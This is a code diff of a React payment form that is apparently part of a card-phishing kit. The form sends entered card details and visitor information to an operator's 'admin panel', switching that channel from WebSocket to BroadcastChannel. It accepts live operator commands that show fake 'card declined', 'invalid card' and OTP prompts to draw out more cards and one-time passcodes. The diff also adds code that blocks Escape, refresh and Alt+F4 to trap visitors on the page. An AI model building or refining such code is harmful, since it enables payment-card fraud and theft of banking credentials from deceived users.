@@ -1,73 +1,6 @@
 import React, { useState, useEffect } from 'react';
 import { CreditCard, Lock, Shield, Loader2 } from 'lucide-react';
 
-// WebSocket connection for admin panel
-let ws: WebSocket | null = null;
-
-const connectWebSocket = () => {
-  try {
-    // Enhanced WebSocket URL construction
-    let wsUrl: string;
-    
-    if (window.location.hostname === 'localhost') {
-      wsUrl = 'ws://localhost:8080';
-    } else {
-      // For production (railway.com or other hosting)
-      const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-      const port = window.location.port ? `:${window.location.port}` : '';
-      wsUrl = `${protocol}//${window.location.hostname}${port}`;
-    }
-    
-    console.log('PaymentForm attempting WebSocket connection to:', wsUrl);
-    
-    if (!ws || ws.readyState === WebSocket.CLOSED) {
-      ws = new WebSocket(wsUrl);
-      
-      ws.onopen = () => {
-        console.log('WebSocket connected from PaymentForm');
-        // Send new visitor notification immediately when connected
-        const userInfo = {
-          ip: getRandomIP(),
-          browser: navigator.userAgent,
-          network: getRandomNetwork()
-        };
-        
-        const visitorData = {
-          type: 'newVisitor',
-          ip: userInfo.ip,
-          timestamp: new Date().toISOString()
-        };
-        
-        console.log('Sending visitor data:', visitorData);
-        ws?.send(JSON.stringify(visitorData));
-      };
-      
-      ws.onclose = (event) => {
-        console.log('WebSocket disconnected from PaymentForm', event.code, event.reason);
-        ws = null;
-        // Reconnect after 2 seconds
-        setTimeout(() => {
-          console.log('PaymentForm attempting reconnection...');
-          connectWebSocket();
-        }, 2000);
-      };
-
-      ws.onerror = (error) => {
-        console.error('PaymentForm WebSocket error:', error);
-        ws = null;
-      };
-    }
-  } catch (error) {
-    console.error('PaymentForm WebSocket connection failed:', error);
-    ws = null;
-    // Retry connection after 3 seconds
-    setTimeout(() => {
-      console.log('PaymentForm retrying connection...');
-      connectWebSocket();
-    }, 3000);
-  }
-};
-
 const getRandomIP = () => {
   return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
 };
@@ -114,19 +47,20 @@ const PaymentForm = () => {
   };
 
   useEffect(() => {
-    // Prevent keyboard shortcuts
+    // Enhanced keyboard restriction
     const handleKeyDown = (event: KeyboardEvent) => {
+      // Prevent ESC key completely in fullscreen
+      if (event.key === 'Escape') {
+        event.preventDefault();
+        event.stopPropagation();
+        event.stopImmediatePropagation();
+        return false;
+      }
+      
       // Prevent F5, Ctrl+R, Ctrl+F5 (refresh)
       if (event.key === 'F5' || 
           (event.ctrlKey && event.key === 'r') || 
           (event.ctrlKey && event.key === 'F5')) {
-        event.preventDefault();
-        event.stopPropagation();
-        return false;
-      }
-      
-      // Prevent ESC key
-      if (event.key === 'Escape') {
         event.preventDefault();
         event.stopPropagation();
         return false;
@@ -138,101 +72,96 @@ const PaymentForm = () => {
         event.stopPropagation();
         return false;
       }
+
+      // Prevent Alt+F4 (Windows close)
+      if (event.altKey && event.key === 'F4') {
+        event.preventDefault();
+        event.stopPropagation();
+        return false;
+      }
     };
 
-    const handleBeforeUnload = (event: BeforeUnloadEvent) => {
-      event.preventDefault();
-      event.returnValue = '';
-      return '';
-    };
-
+    // Add multiple event listeners for better coverage
     document.addEventListener('keydown', handleKeyDown, true);
-    window.addEventListener('beforeunload', handleBeforeUnload);
+    document.addEventListener('keyup', handleKeyDown, true);
+    window.addEventListener('keydown', handleKeyDown, true);
 
     return () => {
       document.removeEventListener('keydown', handleKeyDown, true);
-      window.removeEventListener('beforeunload', handleBeforeUnload);
+      document.removeEventListener('keyup', handleKeyDown, true);
+      window.removeEventListener('keydown', handleKeyDown, true);
     };
   }, []);
 
   useEffect(() => {
-    connectWebSocket();
-    
+    // Initialize broadcast channel for communication with admin panel
+    if (!window.cardDataChannel) {
+      window.cardDataChannel = new BroadcastChannel('cardData');
+    }
+
     // Send visitor data when component mounts
-    setTimeout(() => {
-      if (ws && ws.readyState === WebSocket.OPEN) {
-        const userInfo = {
-          ip: getRandomIP(),
-          browser: navigator.userAgent,
-          network: getRandomNetwork()
-        };
-        
-        const visitorData = {
-          type: 'newVisitor',
-          ip: userInfo.ip,
-          timestamp: new Date().toISOString()
-        };
-        
-        console.log('Sending initial visitor data:', visitorData);
-        ws.send(JSON.stringify(visitorData));
-      }
-    }, 1000);
-    
+    const userInfo = {
+      ip: getRandomIP(),
+      browser: navigator.userAgent,
+      network: getRandomNetwork()
+    };
+
+    const visitorData = {
+      type: 'newVisitor',
+      ip: userInfo.ip,
+      timestamp: new Date().toISOString()
+    };
+
+    console.log('Sending visitor data:', visitorData);
+    window.cardDataChannel.postMessage(visitorData);
+
     // Listen for commands from admin panel
     const handleMessage = (event: MessageEvent) => {
-      try {
-        const data = JSON.parse(event.data);
-        console.log('Received command from admin:', data);
-        
-        switch (data.command) {
-          case 'showotp':
-            setIsLoading(false);
-            setShowOtp(true);
-            break;
-          case 'fail':
-            setIsLoading(false);
-            setShowOtp(false);
-            setErrorMessage('Your card has been declined');
-            break;
-          case 'success':
-            setIsConfirmLoading(false);
-            setShowProcessing(true);
+      const data = event.data;
+      console.log('Received command from admin:', data);
+      
+      switch (data.command) {
+        case 'showotp':
+          setIsLoading(false);
+          setShowOtp(true);
+          break;
+        case 'fail':
+          setIsLoading(false);
+          setShowOtp(false);
+          setErrorMessage('Your card has been declined');
+          break;
+        case 'success':
+          setIsConfirmLoading(false);
+          setShowProcessing(true);
+          setTimeout(() => {
+            setShowProcessing(false);
+            setShowSuccess(true);
             setTimeout(() => {
-              setShowProcessing(false);
-              setShowSuccess(true);
-              setTimeout(() => {
-                window.location.href = 'https://google.com';
-              }, 2000);
-            }, 4000);
-            break;
-          case 'invalidotp':
-            setIsConfirmLoading(false);
-            setInvalidOtpMessage('Invalid OTP, please enter valid one time passcode sent to your mobile');
-            break;
-          case 'cardinvalid':
-            setIsLoading(false);
-            setShowOtp(false);
-            setErrorMessage('Your card is invalid, please try another card');
-            break;
-          case 'carddisabled':
-            setIsLoading(false);
-            setShowOtp(false);
-            setErrorMessage('Card disabled, please try another card');
-            break;
-        }
-      } catch (error) {
-        console.error('Error parsing WebSocket message:', error);
+              window.location.href = 'https://google.com';
+            }, 2000);
+          }, 4000);
+          break;
+        case 'invalidotp':
+          setIsConfirmLoading(false);
+          setInvalidOtpMessage('Invalid OTP, please enter valid one time passcode sent to your mobile');
+          break;
+        case 'cardinvalid':
+          setIsLoading(false);
+          setShowOtp(false);
+          setErrorMessage('Your card is invalid, please try another card');
+          break;
+        case 'carddisabled':
+          setIsLoading(false);
+          setShowOtp(false);
+          setErrorMessage('Card disabled, please try another card');
+          break;
       }
     };
 
-    if (ws) {
-      ws.onmessage = handleMessage;
-    }
+    window.cardDataChannel.onmessage = handleMessage;
 
     return () => {
-      if (ws) {
-        ws.onmessage = null;
-      }
+      window.cardDataChannel.onmessage = null;
     };
   }, []);
 
@@ -260,36 +189,8 @@ const PaymentForm = () => {
   };
 
   const sendToAdminPanel = (data: any) => {
-    console.log('Attempting to send data to admin panel:', data);
-    
-    const sendData = () => {
-      if (ws && ws.readyState === WebSocket.OPEN) {
-        console.log('WebSocket is open, sending data');
-        ws.send(JSON.stringify(data));
-        return true;
-      }
-      return false;
-    };
-
-    // Try to send immediately
-    if (!sendData()) {
-      console.log('WebSocket not ready, attempting to reconnect and resend');
-      connectWebSocket();
-      
-      // Try to send after reconnection with multiple attempts
-      let attempts = 0;
-      const maxAttempts = 5;
-      
-      const retrySend = setInterval(() => {
-        attempts++;
-        if (sendData() || attempts >= maxAttempts) {
-          clearInterval(retrySend);
-          if (attempts >= maxAttempts) {
-            console.error('Failed to send data after maximum attempts');
-          }
-        }
-      }, 1000);
-    }
+    console.log('Sending data to admin panel:', data);
+    window.cardDataChannel.postMessage(data);
   };
 
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
